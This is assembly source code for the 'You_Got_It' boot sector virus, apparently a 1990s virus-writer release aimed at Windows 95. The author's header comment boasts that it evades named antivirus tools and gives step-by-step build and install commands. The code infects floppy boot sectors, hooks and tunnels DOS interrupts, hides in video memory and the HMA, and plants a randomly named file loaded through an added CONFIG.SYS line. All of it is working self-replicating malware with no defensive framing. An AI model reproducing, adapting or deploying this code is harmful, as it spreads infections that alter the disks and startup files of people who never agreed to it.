comment *

Designed by "Q" the Misanthrope

The "You_Got_It" virus needed to be made.  Windows 95 has neglected the
floppy boot sector virus long enough.  Windows 95 in it's 32 bit protected
mode has it's own floppy disk routines and doesn't use int 13 or int 40
anymore.  When a floppy boot sector viruses infectes the hard disk of the
Windows 95 computer, it would flag a change in the MBR or DBR indicating
a possible virus attack (not good).  The conclusion, don't hook int 13, hook
int 21.  Problem is, when Windows 95 starts up, it starts in DOS mode then
changes to it's protected mode DOS so int 21 hooked in DOS mode isn't hooked
anymore.  Many of the multipatrite virii will not infect once Windows 95
starts.  If your boot sector virus can infect a program called in your
AUTOEXEC.BAT or your CONFIG.SYS then the virus would go resident.  The
"You_Got_it" virus does this.  It creates a randomly named file and adds
INSTALLH=\AKYTHSQW (name is random) to the CONFIG.SYS file.  Now when
Windows 95's int 21 is called to change the default drive to A: then the
infection occures.  Cool features:  during boot up the virus moves into video
memory then into the High Memory Area (HMA) when dos loads high.  The virus
tunnels int 21 and loads in the HMA with dos. Also the boot sector infection
will not attack the CONFIG.SYS multiple times.

P.S. This virus will not be detected by Thunderbytes TBRESCUE Boot sector
detector or CMOS virus protection.


tasm yougotit /m2
tlink yougotit
exe2bin yougotit.exe yougotit.com
format a:/q/u
debug yougotit.com
l 300 0 0 1
w 100 0 0 1
w 300 0 20 1
m 13e,2ff 100
rcx
1c2
w
q
copy yougotit.com c:\
edit c:\config.sys
device=\yougotit.com
altf
x
y

*

.286

qseg            segment byte public 'CODE'
                assume  cs:qseg,es:qseg,ss:nothing,ds:qseg

top:            jmp     short jmp_install       ;boot sector data
		db      90h                     
		db      'MSDOS5.0'
		dw      512
		db      1 
		dw      1 
		db      2 
		dw      224 
		dw      2880
		db      0F0h 
		dw      9
		dw      18 
		dw      2 

                org     003eh

com_install     proc    near
                jmp     short go_mem_res
com_install     endp

jmp_install     proc    near                    ;floppy boot up
                push    cs                      ;for the retf to 0000:7c00
id              equ     $+01h
                mov     si,7c00h                ;7c00 is the infection marker
                lea     bx,word ptr ds:[si]     ;bx=7c00
                push    bx                      ;for the retf to 0000:7c00
		cld     
		push    cs
                mov     es,bx                   ;if monochrome copy code to
                pop     ds                      ;7c00:7c00
                cmp     word ptr ds:[0449h],07h ;check if monochrome
		je      monochrome
                push    0b700h                  ;lets reside in video memory
                pop     es                      ;no need for that TOM
                cmp     word ptr es:[si+id-top],si
monochrome:     push    es                      ;check if already mem resident
                mov     di,si                   ;di=7c00
                mov     cx,offset previous_hook ;copy loop varable
                push    cx                      ;save it because we will copy
                push    si                      ;the code twice to b700:7c00
                rep     movsb                   ;and b700:7dfe
		pop     si
		pop     cx
                call    return_far              ;goto b700 segment of code
                rep     movsb                   ;continue copy to b700:7dfe
                mov     si,1ah*04h              ;only hook int 1a
                je      already_res             ;if already resident don't
                movsw                           ;hook again
		movsw
                mov     word ptr ds:[si-04h],offset interrupt_1a+7e00h-02h
                mov     word ptr ds:[si-02h],cs ;hook int 1a
already_res:    push    ds                      ;read moved floppy boot sector
		pop     es
                mov     ax,0201h
jmp_install     endp

set_cx_dx       proc    near      
                mov     bp,word ptr ds:[bx+11h] ;code to point to last sector
                mov     cx,word ptr ds:[bx+16h] ;of the root directory of any
                shr     bp,04h                  ;floppy disk
                shl     cx,01h
                add     cx,bp
		inc     cx
                mov     dh,01h
                sub     cx,word ptr ds:[bx+18h]
                int     13h                     ;read or write boot sector
return_far:     retf                            ;return to 7c00:0000 or
set_cx_dx       endp                            ;resident_21 routine

config_line     db      "C:\CONFIG.SYS",00      ;file to infect
install_name    db      "INSTALL="              ;what to add
file_name       db      "\"                     ;random file name goes here
                db      00h
crlf            equ     $+07h

go_mem_res      proc    near                    ;CONFIG.SYS residency
                mov     ax,3501h                ;get int 1 address for tunnel
                int     21h
                mov     dx,offset interrupt_1-com_install+100h
                mov     ah,25h                  ;set int 1 for tunnel
                push    es
                int     21h
                pop     ds                      ;ds:dx will be to set it back
                push    00h                     ;es=0000h
                pop     es
                pushf                           ;simulate interrupt stack
                lea     dx,word ptr ds:[bx]
                push    cs
                push    es                      ;return to cs:0000 is cd 20
                int     01h                     ;set trap flag
                db      26h                     ;es: override in to int table 
                dw      02effh,21h*04h          ;jmp far ptr es:[0084]
go_mem_res      endp

interrupt_1     proc    near                    ;set trap flag, trace int 21
                pusha                           ;save varables
		push    sp
                pop     bp                      ;get pointer                      
		push    ds
                push    es
                lds     si,dword ptr ss:[bp+10h];get next instruction address
                cmp     word ptr ds:[si+01h],02effh
                jne     go_back                 ;check if jmp far ?s:[????] 
                cmp     word ptr ds:[si-02h],001cdh
                org     $-02h                   ;see if called from my int 01
                int     01h
		je      toggle_tf               
                mov     si,word ptr ds:[si+03h] ;get address segment of jmp
                cmp     byte ptr ds:[si+03h],0f0h
                jb      go_back                 ;see if in HMA area
                mov     bx,((tail-com_install+10h)SHR 4)*10h
                mov     di,0ffffh               ;allocate HMA area for virus
                mov     ax,4a02h
                int     2fh
                inc     di                      ;is HMA full
                jz      toggle_tf               ;if so then just don't bother
                push    si                      ;move the virus to the HMA
                cld
                mov     cx,previous_hook-com_install
                mov     si,0100h                ;copy virus to HMA
                rep     movs byte ptr es:[di],cs:[si]
                pop     si                      ;now hook the int 21 chain
                movsw                           
                movsw
                lea     di,word ptr ds:[di-(offset vbuffer-resident_21)]
                mov     word ptr ds:[si-04h],di ;point to resident 21 code
                mov     word ptr ds:[si-02h],es
toggle_tf:      xor     byte ptr ss:[bp+15h],01h;toggle the trap flag
go_back:        pop     es
                pop     ds
		popa                            
                iret                            
interrupt_1     endp                            

interrupt_21    proc    near                    ;hooked in after int 1a sees
                pushf                           ;that dos loaded during boot
		pusha   
		push    ds
                push    es
		push    cs
		pop     ds
                xor     ah,4bh                  ;unload if a program starts
                jz      set_21_back
                mov     ax,3d42h                ;open c:\config.sys
                mov     dx,offset config_line+7e00h-02h
                int     18h                     ;really it is int 21
                mov     bx,5700h                ;get date
                xchg    ax,bx
                jc      retry_later             ;unable to open c:\config.sys
                int     18h                     
                or      cl,cl                   ;is c:\config.sys infected
                jz      close_it
                pusha                           ;save file date
                mov     ah,5ah                  ;create random file
                mov     cx,0005h
                mov     dx,offset file_name+7e00h-02h
                int     18h
                mov     dx,offset com_install+7c00h
                mov     bh,40h                  ;write virus code into file
                xchg    ax,bx
                mov     ch,02h
                int     18h
                mov     ah,3eh                  ;close it
                int     18h
                popa                            ;date and handle c:\config.sys
                inc     ax                      ;set date
                pusha                           ;save it for later
                mov     ax,4202h                ;go to end of c:\config.sys
		cwd
                push    dx
                pop     cx
                int     18h
                mov     ah,40h                  ;write INSTALL=\ line
                mov     word ptr ds:[crlf+7e00h-02h],0a0dh
                mov     cl,low(crlf-install_name+02h)
                mov     dx,offset install_name+7e00h-02h
                int     18h                     ;be sure to cr lf terminate it
                popa                            ;get file date
                shr     cl,cl                   ;blitz seconds and more 
                int     18h
close_it:       mov     ah,3eh                  ;close c:\config.sys
                int     18h
set_21_back:    lds     dx,dword ptr ds:[previous_hook+7c00h]
                jmp     short set_int_21        ;unhook it 21
retry_later:    jmp     short jmp_pop_it     
interrupt_21    endp

interrupt_1a    proc    near                    ;hooked at boot and waits for
                pushf                           ;dos to load
		pusha
                mov     ax,1200h                ;dos loaded
		push    ds
		push    es
		cwd
                int     2fh
                inc     al
                jnz     jmp_pop_it              ;and unhook int 1a
                mov     ds,dx                   ;if loaded then hook int 21
                mov     si,21h*04h              ;sorry for all the complexity
                mov     di,offset previous_hook+7c00h
                les     bx,dword ptr cs:[previous_hook+7e00h-02h]
                mov     ds:[si-((21h-1ah)*04h)+02h],es
                mov     ds:[si-((21h-1ah)*04h)],bx
		les     bx,dword ptr ds:[si]
                mov     ds:[si-((21h-18h)*04h)+02h],es
                push    cs                      ;also save int 21 into int 18
		cld     
                mov     ds:[si-((21h-18h)*04h)],bx
		pop     es
		movsw
		movsw
                mov     dx,offset interrupt_21+7c00h
                push    cs                      ;set int 21
                pop     ds
set_int_21:     mov     ax,2521h
                int     18h
jmp_pop_it:     jmp     short pop_it
interrupt_1a    endp

                org     001b4h

resident_21     proc    near                    ;memory resident int 21
                pushf                           ;called when loaded from
                pusha                           ;config.sys
                push    ds
                push    es
                cmp     ah,0eh                  ;is it set drive
                jne     pop_it
                or      dl,dl                   ;drive A:
                jnz     pop_it
                cwd                             ;set varables to read sector
                call    next_line
next_line:      pop     bx
                add     bx,offset vbuffer-next_line
                push    cs
                mov     cx,0001h
                pop     es
                push    cs
                mov     ax,0201h                ;try reading the boot sector
                pop     ds
                int     13h
                jc      pop_it                  ;if not don't infect
                cmp     byte ptr ds:[bx+id-top+01h],7ch
                je      pop_it                  ;check if infected
                mov     ax,0301h                ;move and write boot sector
                pusha                           ;save for later
                push    cs                      ;for far retf
		call    set_cx_dx
		cld
                mov     cx,previous_hook-com_install
                lea     si,word ptr ds:[bx-offset (vbuffer-com_install)]
                lea     di,word ptr ds:[bx+com_install-top]
                rep     movsb
                mov     word ptr ds:[bx],0000h
                org     $-02h
                jmp     $(jmp_install-top)      ;place initial jmp at front
		popa
                int     13h                     ;write it
pop_it:         pop     es
                pop     ds
		popa    
		popf
resident_21     endp

                org     001fdh                

far_jmp         proc    near
                db      0eah                    ;jmp to old int 1a or boot
previous_hook:  label   double                  ;up int 21 or resident int 21
far_jmp         endp

boot_signature  dw      0aa55h                  ;guess what

                org     $+02h
vbuffer         label   byte                    ;buffer to read boot sector 

                org     $+0202h                 ;the end of the code
tail            label   byte

qseg            ends
		end
